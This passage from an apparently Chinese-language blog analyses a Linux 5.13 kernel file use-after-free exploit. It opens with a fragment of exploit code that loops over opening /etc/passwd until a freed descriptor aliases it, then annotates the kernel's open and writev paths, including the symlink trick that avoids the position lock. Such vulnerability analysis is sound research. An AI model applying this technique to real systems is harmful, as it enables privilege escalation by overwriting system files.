class="keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) ==</span><br><span class="line">            <span class="number">0</span>) &#123;</span><br><span class="line">            found = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[!] found, file id %d\n&quot;</span>, i);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">                close(fds[j]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (found) &#123;</span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>连续地打开 <code>/etc/passwd</code> 文件，判断文件描述符和 <code>uaf_fd</code> 是否为同一文件，如果是那么设置 <code>found=1</code>。</p><p>在这个地方触发了漏洞导致了 uaf 文件描述符写入了 <code>/etc/passwd</code> 文件。</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>选用对应源码版本：<a href="https://elixir.bootlin.com/linux/v5.13.3/source">https://elixir.bootlin.com/linux/v5.13.3/source</a></p><h3 id="open"><a href="#open" class="headerlink" title="open"></a>open</h3><p>在利用中线程 1 （局部变量 <code>fd</code>）和线程 2 （全局变量 <code>uaf_fd</code>）都打开了一个文件（<code>./uaf</code>），如果 <code>uaf</code> 是普通文件，那么 <code>FMODE_ATOMIC_POS</code> 这个标志位必定存在，但是如果是链接文件，则这里不会被设置这个标记，可以避免被卡在这个函数。</p><p>具体的代码可以查看 <code>open</code> 函数的调用，相关解释已加注释。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_dentry_open</span><span class="params">(<span class="keyword">struct</span> file *f,</span></span><br><span class="line"><span class="params">                          <span class="keyword">struct</span> inode *inode,</span></span><br><span class="line"><span class="params">                          <span class="type">int</span> (*open)(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">empty_fops</span> =</span> &#123;&#125;;</span><br><span class="line">    <span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">    path_get(&amp;f-&gt;f_path);</span><br><span class="line">    f-&gt;f_inode = inode;</span><br><span class="line">    f-&gt;f_mapping = inode-&gt;i_mapping;</span><br><span class="line">    f-&gt;f_wb_err = filemap_sample_wb_err(f-&gt;f_mapping);</span><br><span class="line">    f-&gt;f_sb_err = file_sample_sb_err(f);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(f-&gt;f_flags &amp; O_PATH)) &#123;</span><br><span class="line">        f-&gt;f_mode = FMODE_PATH | FMODE_OPENED;</span><br><span class="line">        f-&gt;f_op = &amp;empty_fops;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;f_mode &amp; FMODE_WRITE &amp;&amp; !special_file(inode-&gt;i_mode)) &#123;</span><br><span class="line">        error = get_write_access(inode);</span><br><span class="line">        <span class="keyword">if</span> (unlikely(error))</span><br><span class="line">            <span class="keyword">goto</span> cleanup_file;</span><br><span class="line">        error = __mnt_want_write(f-&gt;f_path.mnt);</span><br><span class="line">        <span class="keyword">if</span> (unlikely(error)) &#123;</span><br><span class="line">            put_write_access(inode);</span><br><span class="line">            <span class="keyword">goto</span> cleanup_file;</span><br><span class="line">        &#125;</span><br><span class="line">        f-&gt;f_mode |= FMODE_WRITER;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* POSIX.1-2008/SUSv4 Section XSI 2.9.7 */</span></span><br><span class="line">    <span class="keyword">if</span> (S_ISREG(inode-&gt;i_mode) || S_ISDIR(inode-&gt;i_mode))</span><br><span class="line">        f-&gt;f_mode |= FMODE_ATOMIC_POS;</span><br><span class="line"><span class="comment">//这里可以看到，如果打开的文件是目录（DIR）类型或者是常规（REG）类型的文件，则必定加上一个 FMODE_ATOMIC_POS 标记，因此需要通过建立链接来绕过</span></span><br><span class="line">    f-&gt;f_op = fops_get(inode-&gt;i_fop);</span><br><span class="line">    <span class="keyword">if</span> (WARN_ON(!f-&gt;f_op)) &#123;</span><br><span class="line">        error = -ENODEV;</span><br><span class="line">        <span class="keyword">goto</span> cleanup_all;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...这里省略了很多代码</span></span><br><span class="line">cleanup_all:</span><br><span class="line">    <span class="keyword">if</span> (WARN_ON_ONCE(error &gt; <span class="number">0</span>))</span><br><span class="line">        error = -EINVAL;</span><br><span class="line">    fops_put(f-&gt;f_op);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;f_mode &amp; FMODE_WRITER) &#123;</span><br><span class="line">        put_write_access(inode);</span><br><span class="line">        __mnt_drop_write(f-&gt;f_path.mnt);</span><br><span class="line">    &#125;</span><br><span class="line">cleanup_file:</span><br><span class="line">    path_put(&amp;f-&gt;f_path);</span><br><span class="line">    f-&gt;f_path.mnt = <span class="literal">NULL</span>;</span><br><span class="line">    f-&gt;f_path.dentry = <span class="literal">NULL</span>;</span><br><span class="line">    f-&gt;f_inode = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="writev"><a href="#writev" class="headerlink" title="writev"></a>writev</h3><p>主要要分析的是 <code>sys_writev</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(writev, <span class="type">unsigned</span> <span class="type">long</span>, fd, <span class="type">const</span> <span class="keyword">struct</span> iovec __user *, vec,</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">long</span>, vlen)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> do_writev(fd, vec, vlen, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>深入这个函数来看看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">do_writev</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec __user *vec,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> vlen, <span class="type">rwf_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span> =</span> fdget_pos(fd);</span><br><span class="line">    <span class="type">ssize_t</span> ret = -EBADF;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (f.file) &#123;</span><br><span class="line">        <span class="type">loff_t</span> pos, *ppos = file_ppos(f.file);</span><br><span class="line">        <span class="keyword">if</span> (ppos) &#123;</span><br><span class="line">            pos = *ppos;</span><br><span class="line">            ppos = &amp;pos;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = vfs_writev(f.file, vec, vlen, ppos, flags);</span><br><span class="line">        <span class="keyword">if</span> (ret &gt;= <span class="number">0</span> &amp;&amp; ppos)</span><br><span class="line">            f.file-&gt;f_pos = pos;</span><br><span class="line">        fdput_pos(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">        add_wchar(current, ret);</span><br><span class="line">    inc_syscw(current);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来其实非常简单，也就是先根据文件描述符去获取 fd 结构，fd 结构里面维护了当前打开的文件的写指针和读指针，第一步先获取，然后调用 <code>vfs_writev</code> 去写该文件，随后释放文件结构，如果返回值 &gt;0，则增加当前文件写入字符数（<code>add_wchar</code>），增加当前系统调用次数（<code>inc_syscw</code>）</p><p>同样从头到尾来看看函数定义，首先是这个获取文件结构的 <code>fdget_pos</code>，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> fd <span class="title function_">fdget_pos</span><span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> __to_fd(__fdget_pos(fd));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再深入看看 <code>__to_fd</code> 和 <code>__fget_pos</code> 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">fd</span> __<span class="title">to_fd</span>(<span class="title">unsigned</span> <span class="title">long</span> <span class="title">v</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> fd)&#123;(<span class="keyword">struct</span> file *)(v &amp; ~<span class="number">3</span>),v &amp; <span class="number">3</span>&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无疑 <code>__to_fd</code> 函数将获得的文件结构 <code>struct file</code> 转为 <code>struct fd</code>。</p><p><code>__fdget_pos</code> 就应当是根据文件描述符来获取文件结构 <code>struct file</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __fdget_pos(<span class="type">unsigned</span> <span class="type">int</span> fd)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> v = __fdget(fd);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span> =</span> (<span class="keyword">struct</span> file *)(v &amp; ~<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file &amp;&amp; (file-&gt;f_mode &amp; FMODE_ATOMIC_POS)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_count(file) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            v |= FDPUT_POS_UNLOCK;</span><br><span class="line">            mutex_lock(&amp;file-&gt;f_pos_lock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>深入下去 <code>__fdget</code> 可以发现里面调用了 <code>__fget_light</code>，第二个参数被固定为 <code>FMODE_PATH</code>，对于这个函数定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* File is opened with O_PATH; almost nothing can be done with it */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FMODE_PATH((__force fmode_t)0x4000)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __fdget(<span class="type">unsigned</span> <span class="type">int</span> fd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __fget_light(fd, FMODE_PATH);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Lightweight file lookup - no refcnt increment if fd table isn&#x27;t shared.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can use this instead of fget if you satisfy all of the following</span></span><br><span class="line"><span class="comment"> * conditions:</span></span><br><span class="line"><span class="comment"> * 1) You must call fput_light before exiting the syscall and returning control</span></span><br><span class="line"><span class="comment"> *    to userspace (i.e. you cannot remember the returned struct file * after</span></span><br><span class="line"><span class="comment"> *    returning to userspace).</span></span><br><span class="line"><span class="comment"> * 2) You must not call filp_close on the returned struct file * in between</span></span><br><span class="line"><span class="comment"> *    calls to fget_light and fput_light.</span></span><br><span class="line"><span class="comment"> * 3) You must not clone the current task in between the calls to fget_light</span></span><br><span class="line"><span class="comment"> *    and fput_light.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The fput_needed flag returned by fget_light should be passed to the</span></span><br><span class="line"><span class="comment"> * corresponding fput_light.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> __fget_light(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="type">fmode_t</span> mask)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> =</span> current-&gt;files;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="type">atomic_read</span>(&amp;files-&gt;count) == <span class="number">1</span>) &#123;</span><br><span class="line">        file = files_lookup_fd_raw(files, fd);</span><br><span class="line">        <span class="keyword">if</span> (!file || unlikely(file-&gt;f_mode &amp; mask))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">long</span>)file;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        file = __fget(fd, mask, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (!file)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> FDPUT_FPUT | (<span class="type">unsigned</span> <span class="type">long</span>)file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里也解释了这个宏的定义，表示文件几乎不能做任何操作比如说 <code>READ,WRITE</code>，而这里的 <code>mask</code> 在后面分析是禁止的一些操作，比如文件具有 <code>READ</code> 权限但是 <code>mask</code> 被设置为 <code>FMODE_READ</code>，那么在后续的调用中会返回 <code>NULL</code>。</p><p>先获取当前进程的文件描述符表（<code>current-&gt;files</code>），然后判断文件描述符表的引用计数是否为 <code>1</code> （描述符表是否共享），如果是则调用 <code>files_lookup_fd_raw</code> 去获取文件结构指针，然后判断文件操作模式的正确性，随后返回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The caller must ensure that fd table isn&#x27;t shared or hold rcu or file lock</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> file *<span class="title function_">files_lookup_fd_raw</span><span class="params">(<span class="keyword">struct</span> files_struct *files, <span class="type">unsigned</span> <span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span> =</span> rcu_dereference_raw(files-&gt;fdt);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; fdt-&gt;max_fds) &#123;</span><br><span class="line">        fd = array_index_nospec(fd, fdt-&gt;max_fds);</span><br><span class="line">        <span class="keyword">return</span> rcu_dereference_raw(fdt-&gt;fd[fd]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据注释也可以认为，需要保证文件描述符表没有被共享过，或者是持有文件锁。会返回一个 <code>fd</code> 表中的 <code>struct file</code> 结构（<code>fdt-&gt;fd[fd]</code>）。</p><p>如果引用计数不为 <code>1</code>，则调用 <code>__fget</code> 去获取指针，其中主要是调用了 <code>__fget_files</code> 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> get_file_rcu_many(x, cnt)\</span></span><br><span class="line"><span class="meta">atomic_long_add_unless(&amp;(x)-&gt;f_count, (cnt), 0)</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *__<span class="title">fget_files</span>(<span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">fd</span>,</span></span><br><span class="line"><span class="class">                                 <span class="title">fmode_t</span> <span class="title">mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">refs</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    rcu_read_lock();</span><br><span class="line">loop:</span><br><span class="line">    file = files_lookup_fd_rcu(files, fd);</span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">        <span class="comment">/* File object ref couldn&#x27;t be taken.</span></span><br><span class="line"><span class="comment"> * dup2() atomicity guarantee is the reason</span></span><br><span class="line"><span class="comment"> * we loop to catch the new file (or NULL pointer)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="keyword">if</span> (file-&gt;f_mode &amp; mask)</span><br><span class="line">            file = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!get_file_rcu_many(file, refs))</span><br><span class="line">            <span class="keyword">goto</span> loop;</span><br><span class="line">    &#125;</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *__<span class="title">fget</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">fd</span>, <span class="title">fmode_t</span> <span class="title">mask</span>,</span></span><br><span class="line"><span class="class">                                  <span class="title">unsigned</span> <span class="title">int</span> <span class="title">refs</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">return</span> __fget_files(current-&gt;files, fd, mask, refs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的 <code>files_lookup_fd_rcu</code> 直接可以认为是获取文件结构体的，随后判断里面是否包含禁止的模式，然后增加文件计数引用 （<code>get_file_rcu_many</code>）。</p><p>回过头来看看 <code>__fdget_pos</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __fdget_pos(<span class="type">unsigned</span> <span class="type">int</span> fd)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> v = __fdget(fd);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span> =</span> (<span class="keyword">struct</span> file *)(v &amp; ~<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file &amp;&amp; (file-&gt;f_mode &amp; FMODE_ATOMIC_POS)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_count(file) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            v |= FDPUT_POS_UNLOCK;</span><br><span class="line">            mutex_lock(&amp;file-&gt;f_pos_lock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取到的文件指针将最低两位置为 0（对齐），如果被设置了 <code>FMODE_ATOMIC_POS</code> 且 文件引用大于 1，那么上锁，到这里，才分析完 <code>do_writev</code> 的第一句话，来看看接下来的语句，重点是 <code>vfs_writev</code> 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">do_iter_write</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">struct</span> iov_iter *iter,</span></span><br><span class="line"><span class="params"><span class="type">loff_t</span> *pos, <span class="type">rwf_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> tot_len;</span><br><span class="line"><span class="type">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"><span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">tot_len = iov_iter_count(iter);</span><br><span class="line"><span class="keyword">if</span> (!tot_len)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">ret = rw_verify_area(WRITE, file, pos, tot_len);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file-&gt;f_op-&gt;write_iter)</span><br><span class="line">ret = do_iter_readv_writev(file, iter, pos, WRITE, flags);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = do_loop_readv_writev(file, iter, pos, WRITE, flags);</span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">fsnotify_modify(file);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">vfs_writev</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="keyword">struct</span> iovec __user *vec,</span></span><br><span class="line"><span class="params">                          <span class="type">unsigned</span> <span class="type">long</span> vlen, <span class="type">loff_t</span> *pos, <span class="type">rwf_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovstack</span>[<span class="title">UIO_FASTIOV</span>];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">iov</span> =</span> iovstack;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iov_iter</span> <span class="title">iter</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line">    ret = import_iovec(WRITE, vec, vlen, ARRAY_SIZE(iovstack), &amp;iov, &amp;iter);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        file_start_write(file);</span><br><span class="line">        ret = do_iter_write(file, &amp;iter, pos, flags);</span><br><span class="line">        file_end_write(file);</span><br><span class="line">        kfree(iov);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先根据 <code>writev</code> 的结构体解出数据和长度，然后调用 <code>do_iter_write</code> 去写文件，而在 <code>do_iter_write</code> 中可以发现，这里作权限校验了，校验了是否可写以及文件描述符是否可写，这里的两层意思分别是文件本身是否具有可写权限以及你打开的文件描述符是否包含了 <code>O_WRITE</code> 权限位。</p><p>随后进行写，写的过程会根据文件系统调用对应的写函数（<code>write_iter</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">ssize_t</span> <span class="title function_">call_write_iter</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">struct</span> kiocb *kio,</span></span><br><span class="line"><span class="params">                                      <span class="keyword">struct</span> iov_iter *iter)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> file-&gt;f_op-&gt;write_iter(kio, iter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是完整的调用链，感兴趣可以跟一下。</p><p><a href="https://elixir.bootlin.com/linux/v5.13.3/source/fs/read_write.c#L970">do_writev</a>-&gt;<a 